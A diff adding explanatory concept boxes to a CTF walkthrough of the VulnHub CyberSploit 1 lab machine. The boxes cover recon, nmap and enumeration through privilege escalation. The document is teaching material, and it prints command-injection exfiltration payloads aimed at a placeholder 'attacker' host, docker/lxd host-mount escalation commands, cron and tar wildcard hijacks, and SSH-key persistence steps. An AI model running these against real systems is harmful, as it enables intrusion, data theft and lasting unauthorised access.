@@ -32,6 +32,23 @@ Target (cybersploit): 192.168.56.107
 
 ---
 
+> ### 📖 How to read this walkthrough
+>
+> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
+> do — not just the command, but what it is and why it works. They are the point of
+> this document; the commands are only the demonstration.
+>
+> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
+> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
+> escalation). Read the box here for the idea, follow the link when you want the full
+> treatment.
+>
+> **Brand new to this?** Start with
+> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
+> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).
+
+---
+
 ## 0. What you will learn
 
 1. **Host discovery** and a minimal-but-correct port scan.
@@ -80,6 +97,30 @@ ip a
 
 ### 1.2 Who else is alive?
 
+
+> ### 📖 Concept — What is reconnaissance?
+>
+> **Reconnaissance** ("recon") is the phase where you work out *what exists*
+> before you try to break into anything. It is deliberately broad and shallow: you
+> are drawing a map, not attacking a position. The term comes straight from the
+> military — send scouts to look at the terrain before committing troops.
+>
+> On a lab box, recon almost always means one thing: **find the target's IP.** The
+> tools above do it with **ARP** — the layer-2 protocol that answers *"which
+> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
+> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
+> machine that refuses to answer `ping` will still answer ARP.
+>
+> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
+> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
+> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
+> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
+> against your hypervisor's settings** — attacking the wrong host is the classic
+> beginner error.
+>
+> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
+> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)
+
 ```bash
 sudo netdiscover -r 192.168.56.0/24
 ```
@@ -97,6 +138,44 @@ sudo netdiscover -r 192.168.56.0/24
 ```
 
 Or with nmap:
+
+
+> ### 📖 Concept — What is nmap, and how does a port scan work?
+>
+> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
+> magic: it **sends deliberately crafted packets and classifies the responses**.
+> Understand that and every flag becomes predictable.
+>
+> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
+> address gets you to the machine, the port gets you to the service. TCP is
+> connection-oriented, so a scan is really a conversation — the **three-way
+> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
+> replies, and they map directly onto the words in the output:
+>
+> | Target's reply | nmap reports | Meaning |
+> | --- | --- | --- |
+> | **SYN-ACK** | `open` | A program is listening |
+> | **RST** | `closed` | Host up, nothing listening there |
+> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
+>
+> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
+> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
+> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
+> Add `--reason` to any scan to see this evidence column explicitly; it is the best
+> learning flag in nmap.
+>
+> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
+> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
+> fingerprints versions by reading banners and probing against ~10,000 known
+> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
+> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
+> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
+> enables the faster stealthier SYN scan instead of a full connect.
+>
+> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
+> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
+>
+> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)
 
 ```bash
 sudo nmap -sn 192.168.56.0/24
@@ -122,6 +201,27 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 2.31 seconds
 ![netdiscover / nmap -sn finding the target](images/01-recon.png)
 
 ---
+
+
+> ### 📖 Concept — What is enumeration, and how is it different from scanning?
+>
+> **Enumeration** is interrogating the services you found to extract *specific,
+> actionable detail*: usernames, directory paths, share names, versions, database
+> tables.
+>
+> | | **Scanning** | **Enumeration** |
+> | --- | --- | --- |
+> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
+> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
+> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
+>
+> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
+> a login without a username. You cannot crack a hash you never found. You cannot
+> exploit an upload path you do not know. Every successful foothold traces back to an
+> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
+> KEY" in capitals. They are telling you which phase you are skipping.
+>
+> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)
 
 ## 2. Enumeration
 
@@ -234,6 +334,40 @@ Disallow: /
 
 **Method 1 — `base64 -d` locally (preferred):**
 
+
+> ### 📖 Concept — Encoding is not encryption
+>
+> These three get conflated constantly, and the confusion costs hours:
+>
+> | | **Encoding** | **Hashing** | **Encryption** |
+> | --- | --- | --- | --- |
+> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
+> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
+> | Key needed? | No | No | **Yes** |
+> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
+> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
+>
+> **Recognise base64 on sight.** Three reliable tells: the character set is only
+> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
+> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
+>
+> ```bash
+> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
+> # aarti:aarti@gmail.com
+> ```
+>
+> > **Base64 is not a secret.** It exists so binary data survives text-only transport
+> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
+> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
+> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
+>
+> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
+> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
+> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
+> `pbkdf2_sha256$` = Django.
+>
+> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)
+
 ```bash
 curl -s http://192.168.56.107/robots.txt | grep -o '[A-Za-z0-9+/]\{20,\}=\{0,2\}' | tail -1 > flag1.b64
 cat flag1.b64
@@ -264,6 +398,48 @@ echo 'aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA==' | base64 -d ; echo
 ```text
 https://www.youtube.com/c/cybersploit
 ```
+
+
+> ### 📖 Concept — Command injection
+>
+> The application passes your input to a shell:
+>
+> ```php
+> system("ping -c 4 " . $_GET['host']);
+> ```
+>
+> Break out with a shell **metacharacter** and append your own command:
+>
+> | Payload | Effect |
+> | --- | --- |
+> | `; id` | Run sequentially, regardless |
+> | `\| id` | Pipe — run next |
+> | `\|\| id` | Run only if the first **failed** |
+> | `&& id` | Run only if the first **succeeded** |
+> | `` `id` `` | Command substitution |
+> | `$(id)` | Command substitution — preferred, nestable |
+> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
+>
+> **When output comes back**, you are done: `<host>;id` prints the result.
+>
+> **When it does not** ("blind" injection), exfiltrate out-of-band:
+>
+> ```bash
+> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
+> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
+> ; sleep 10                               # a pure timing oracle, needs no network at all
+> ```
+>
+> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
+> log** — a request arriving with the hostname embedded is your proof, and the log also
+> tells you which payload variant the filter allowed through.
+>
+> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
+> as a single string and see which ones come back. Filters are usually a `str_replace`
+> of a short list, and almost always miss something — commonly newline, or a doubled
+> character (`;;` collapsing to `;` after one removal pass).
+>
+> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)
 
 ```bash
 # is it nested? (Lord Of The Root uses two layers — always check)
@@ -321,6 +497,44 @@ encoding.
 
 ### 2.5 Content discovery (for completeness)
 
+
+> ### 📖 Concept — What is content discovery, and what is a wordlist?
+>
+> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
+> There is no cleverness — it is a dictionary attack against the URL space. A web
+> server will serve anything it has but does not advertise an index, so the tool
+> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
+> response.
+>
+> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
+> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
+> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
+> words beats a random generator of millions. Common sources on Kali:
+>
+> | List | Size | Notes |
+> | --- | --- | --- |
+> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
+> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
+> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
+> | **SecLists** | huge | The professional standard — `apt install seclists` |
+>
+> **The status codes are the whole result:** `200` exists and is readable · `201`
+> means a `PUT` succeeded, **you can write files here** · `301` is usually a
+> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
+> it — itself an information leak · `404` is the baseline · `500` means **your input
+> broke something**, often injection.
+>
+> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
+> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
+>
+> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
+> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
+> empty, change the extension list before you change the wordlist.** Try
+> `php,txt,html,bak,old,zip,conf,log,inc`.
+>
+> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
+> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
+
 ```bash
 gobuster dir -u http://192.168.56.107/ \
   -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40 -q
@@ -374,6 +588,49 @@ used together is SSH.** The flag is the password.
 ```bash
 ssh itsskv@192.168.56.107
 ```
+
+
+> ### 📖 Concept — `docker`, `lxd` and `disk` group membership *is* root
+>
+> ```bash
+> id | grep -oE 'docker|lxd|libvirt|disk|sudo|wheel|adm'
+> ```
+>
+> If any of `docker`, `lxd`, `libvirt` or `disk` appears, **you already have root.**
+> There is no nuance: a member can mount the host filesystem or start a privileged
+> container, and from there it is a one-line `echo >> /etc/passwd`.
+>
+> **Why.** Containers share the *host kernel*. A container marked
+> `security.privileged=true` does not drop capabilities and runs its init as **real
+> UID 0**, and a container can be given a disk device that bind-mounts the host's `/`.
+> Put those together and a low-privileged user says: *start a root container, mount
+> the host filesystem at `/mnt/root`, edit `/mnt/root/etc/passwd`.* No isolation is
+> left.
+>
+> ```bash
+> # docker — the host root, chrooted into
+> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+>
+> # docker.sock — talk to the daemon directly, no CLI needed
+> curl --unix-socket /var/run/docker.sock -X POST \
+>   "http://localhost/containers/create?name=pwn" -H 'Content-Type: application/json' \
+>   -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
+>
+> # lxd — build an image on Kali, carry it over, mount the host
+> lxc image import ./alpine.tar.gz --alias myimage
+> lxc init myimage pwn -c security.privileged=true
+> lxc config device add pwn mydev disk source=/ path=/mnt/root recursive=true
+> lxc start pwn && lxc exec pwn /bin/sh      # /mnt/root is now the HOST's /
+> ```
+>
+> `-c security.privileged=true` is the flag that makes this an escalation rather than
+> a sandbox. `source=/` is the host's entire root filesystem.
+>
+> **Defensive corollary:** never add a web-server or service account to a container
+> group. If an application genuinely must launch containers, give it a scoped API
+> token in a restricted project — not group membership.
+>
+> **Deep dive:** [CONCEPTS §15.9 — Container and group escapes](../../docs/CONCEPTS.md#159-container-and-group-escapes)
 
 ```text
 The authenticity of host '192.168.56.107 (192.168.56.107)' can't be established.
@@ -540,6 +797,49 @@ site.
 
 Even on a beginner box, run the checklist — the habit is what you are practising.
 
+
+> ### 📖 Concept — What is SUID?
+>
+> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
+> privileges of the **file's owner** rather than the caller. It exists for a good
+> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
+> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
+>
+> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
+> listing you read it as an **`s`** where the owner's execute bit would be:
+>
+> ```text
+> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
+>       ^            ^
+> ```
+>
+> ```bash
+> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
+> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
+> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
+> ```
+>
+> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
+> match, so it also catches SGID files). `-type f` restricts to regular files.
+> `2>/dev/null` discards the thousands of `Permission denied` errors that would
+> otherwise bury the answer.
+>
+> **Compare against the stock baseline** so the odd entries jump out. Normal on
+> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
+> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
+>
+> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
+> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
+> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
+> `tail`, `head`, `cat`, `rsync`, `apt`.
+>
+> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
+> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
+> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
+> yours as a safety measure, and you end up exactly where you started.
+>
+> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)
+
 ```bash
 itsskv@cybersploit:~$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
 root:x:0:0:root:/root:/bin/bash
@@ -566,6 +866,52 @@ itsskv@cybersploit:~$ find / -perm -4000 -type f 2>/dev/null
 /usr/sbin/pppd
 ```
 
+
+> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
+>
+> **cron** runs commands on a schedule. Jobs may be defined per-user
+> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
+> `/etc/cron.{hourly,daily,weekly,monthly}/`).
+>
+> ```bash
+> cat /etc/crontab
+> ls -la /etc/cron.*
+> crontab -l
+> ls -la /var/spool/cron/crontabs/
+> ```
+>
+> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
+> *user* column, which per-user crontabs do not have. That column is what makes a
+> system cron job run as root.
+>
+> **Three exploitable patterns:**
+>
+> 1. **The script itself is writable** → append
+>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
+> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
+>    **PATH hijack**: create `~/evil/service` containing your payload and
+>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
+> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
+>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
+>    them as options rather than filenames.
+>
+> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
+> > installed by a systemd timer, an init script, or a custom daemon.
+> >
+> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
+> > processes started by *other users* — **without needing root**. Run it and wait 60
+> > seconds:
+> >
+> > ```bash
+> > ./pspy64 -pf
+> > # watch for: root running /opt/script.py every 5 seconds
+> > ```
+> >
+> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
+> > and capabilities are all dead ends, **run pspy before giving up.**
+>
+> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)
+
 ```bash
 itsskv@cybersploit:~$ cat /etc/crontab
 # /etc/crontab: system-wide crontab
@@ -587,6 +933,45 @@ itsskv@cybersploit:~$ which gcc wget python perl
 > gymnastics. That is what makes this box quick.
 
 ---
+
+
+> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
+>
+> You have a shell as a low-privileged user — often `www-data`, the account Apache
+> runs as, which has no usable password and no home directory. **Privilege
+> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
+>
+> Why bother? An ordinary user can read their own files and almost nothing else. Root
+> reads every file, loads kernel modules, changes any password, and installs a
+> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
+> a real engagement root is the difference between "we found a weak password" and "the
+> entire estate is compromised."
+>
+> **The discipline is a checklist, worked from cheapest to most destructive:**
+>
+> | Order | Check | Command |
+> | --- | --- | --- |
+> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
+> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
+> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
+> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
+> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
+> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
+> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
+> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
+>
+> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
+> can panic the VM and cost you a re-import, so it is a last resort, not a first
+> instinct.
+>
+> **Also orient yourself first** — it is one line and it tells you which OS you are
+> on, which decides everything else:
+>
+> ```bash
+> id; whoami; hostname; uname -a; cat /etc/os-release
+> ```
+>
+> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)
 
 ## 5. Privilege escalation — the kernel
 
@@ -614,9 +999,79 @@ Codename:	trusty
 
 **Now go to Exploit-DB via `searchsploit`** — this is the second skill the author named.
 
+
+> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
+>
+> **The identifiers:**
+> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
+>   Look it up at <https://nvd.nist.gov/vuln/search>.
+> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
+>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
+>   than a 5.3 reachable over HTTP.
+> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
+>
+> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
+> with Kali. Offline matters — it works mid-engagement with no internet.
+>
+> ```bash
+> searchsploit wordpress 4.8            # search titles and paths
+> searchsploit -t apache 2.4            # titles only — far fewer false positives
+> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
+> searchsploit -x php/webapps/41006.txt # examine (print) it
+> searchsploit -p 41006                 # show the full path
+> searchsploit --update                 # refresh the local database
+> ```
+>
+> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
+> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
+> > the person running them; (2) you need to know which parameters to change
+> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
+> > entire point of the exercise.
+>
+> The workflow that actually works: get an exact **version** from `nmap -sV` or the
+> app's own footer, search it, read the top candidate, then reproduce the request
+> **by hand with `curl`** so you know what exploitation looked like. Only then decide
+> whether the automated module is worth it.
+>
+> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)
+
 ```bash
 searchsploit ubuntu 14.04 local
 ```
+
+
+> ### 📖 Concept — Kernel exploits: how to match one, and why to use them last
+>
+> ```bash
+> uname -a; cat /proc/version; cat /etc/os-release
+> searchsploit linux kernel $(uname -r | cut -d- -f1)
+> ```
+>
+> Cross-reference the version at <https://www.linuxkernelcves.com/> and
+> <https://github.com/SecWiki/linux-kernel-exploits>. Frequent favourites:
+>
+> | Exploit | Kernel | Mechanism |
+> | --- | --- | --- |
+> | **Dirty COW** (CVE-2016-5195) | < 4.8.3 | Race in copy-on-write → write any file |
+> | **Overlayfs** (CVE-2015-1328) | Ubuntu 3.13–3.19 | Namespace + setuid → root |
+> | **PwnKit** (CVE-2021-4034) | polkit < 0.120 | `pkexec` memory corruption |
+> | **Baron Samedit** (CVE-2021-3156) | sudo < 1.9.5p2 | `sudoedit` heap overflow |
+> | **Dirty Pipe** (CVE-2022-0847) | 5.8 – 5.16.11 | Page-cache write → overwrite any file |
+>
+> **Match the architecture too.** A 32-bit target (`i686` in `uname -a`) needs the
+> 32-bit build; a mismatched exploit fails with a confusing error. Compile with the
+> flags the author specifies — Dirty COW's `40847.cpp` needs
+> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`.
+>
+> > ⚠️ **Use kernel exploits last.** They can panic the VM, corrupt the filesystem
+> > and cost you a full re-import. If a clean misconfiguration path exists — `sudo`,
+> > SUID, capabilities, cron, a writable file — take it. Kernel exploitation is the
+> > fallback when the administrator got everything else right.
+>
+> **Read the exploit before running it.** Many public entries are unverified and some
+> are hostile to whoever runs them. `searchsploit -x <id>` and understand it.
+>
+> **Deep dive:** [CONCEPTS §15.7 — Kernel exploits](../../docs/CONCEPTS.md#157-kernel-exploits)
 
 ```text
 ----------------------------------------------------------------------------------------------- ---------------------------------
@@ -1061,6 +1516,90 @@ database, no filters to bypass, no rabbit holes. The difficulty is entirely in
    AppArmor/SELinux.
 5. **Never put secrets in web-visible files.** `robots.txt` and HTML comments are
    public by definition. Scan your own site in CI:
+
+> ### 📖 Concept — Why CMS config files are such a big deal
+>
+> A CMS must know how to reach its database on **every single page request**, so its
+> config file necessarily contains those credentials **in plaintext**. There is no way
+> to avoid that — it is inherent to how the software works.
+>
+> Three consequences:
+>
+> 1. **Any local user who can read the web root has the database password.**
+> 2. **Any Local File Inclusion anywhere on the site leaks it** — on many boxes you
+>    never get a shell first; you read the config through an LFI and go straight to
+>    the database.
+> 3. **A backup of it is a jackpot.** `wp-config.php.bak`, `.wp-config.php.swp`,
+>    `wp-config.php~` are served as *text* rather than executed, so a misconfigured
+>    server hands them over plain HTTP. `wpscan -e cb` hunts for exactly these.
+>
+> | Stack | Config file |
+> | --- | --- |
+> | WordPress | `wp-config.php` |
+> | Joomla | `configuration.php` |
+> | Laravel / most Node | `.env` |
+> | Django | `settings.py` |
+> | Rails | `config/database.yml`, `config/master.key` |
+> | .NET | `web.config` |
+>
+> ```bash
+> grep -E 'DB_USER|DB_PASSWORD|DB_HOST' wp-config.php
+> mysqldump -u root -p'PASS' wordpress | grep -iE 'flag|password|secret'
+> ```
+>
+> **The real finding is usually not the file — it is `DB_USER = 'root'`.** A CMS should
+> connect with a dedicated least-privilege account that can only `SELECT`/`INSERT`/
+> `UPDATE`/`DELETE` on its own database. When it connects as the database superuser,
+> "read a config file" escalates into "execute operating-system commands as root"
+> (via MySQL's `LOAD_FILE`/`INTO DUMPFILE` and UDF loading).
+>
+> **Deep dive:** [CONCEPTS §9.8 — MySQL](../../docs/CONCEPTS.md#98-mysql--port-3306)
+> ### 📖 Concept — SSH keys: the credential people forget
+>
+> An SSH **private key** is a credential exactly like a password, and finding one is
+> often better than finding a password: no cracking, no lockout, no log noise from
+> failed attempts.
+>
+> | File | What it is |
+> | --- | --- |
+> | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa` | **Private** key — never leaves the owner's machine. If you find one, you have that user's access. |
+> | `~/.ssh/id_rsa.pub` | Public key — harmless on its own |
+> | `~/.ssh/authorized_keys` | Public keys **permitted to log in as this user**. Writable? Append your own key and log in with no password. |
+> | `~/.ssh/known_hosts` | Hosts this user has connected to — **a map of other machines to pivot toward** |
+>
+> ```bash
+> ssh -i id_rsa user@target
+> ssh -i id_rsa -o IdentitiesOnly=yes user@target      # ignore ssh-agent, use only this key
+> ```
+>
+> **If the key is passphrase-protected**, crack it offline — you never touch the
+> server:
+>
+> ```bash
+> ssh2john id_rsa > key.hash
+> john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
+> # or:  hashcat -m 22921 -a 0 key.hash rockyou.txt    (22931 for ed25519)
+> ```
+>
+> **Writing your own key is the cleanest persistence there is:**
+>
+> ```bash
+> ssh-keygen -t ed25519 -f labkey -N ''                # -N '' = no passphrase
+> cat labkey.pub >> /home/user/.ssh/authorized_keys    # if you can write it
+> chmod 600 /home/user/.ssh/authorized_keys            # ssh refuses loose permissions
+> ssh -i labkey user@target
+> ```
+>
+> Note the `chmod 600` — `sshd` **silently ignores** an `authorized_keys` with overly
+> permissive modes, which makes "my key does not work" a permissions problem more
+> often than a key problem.
+>
+> **Always try a found key against *every* user on *every* host** you know about. Key
+> reuse across machines and accounts is extremely common.
+>
+> **Deep dive:** [CONCEPTS §9.9 — SSH](../../docs/CONCEPTS.md#99-ssh--port-22) ·
+> [§16.2 — Harvesting credentials](../../docs/CONCEPTS.md#162-harvesting-credentials)
+
    ```bash
    # deny-list of paths that must return 404
    for p in robots.txt .env .git/config wp-config.php.bak backup.zip id_rsa; do
@@ -1131,6 +1670,8 @@ database, no filters to bypass, no rabbit holes. The difficulty is entirely in
 ---
 
 ## 10. References
+
+- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)
 
 - VulnHub entry: <https://vulnhub.com/entry/cybersploit-1,506/>
 - Series: <https://vulnhub.com/series/cybersploit,340/>
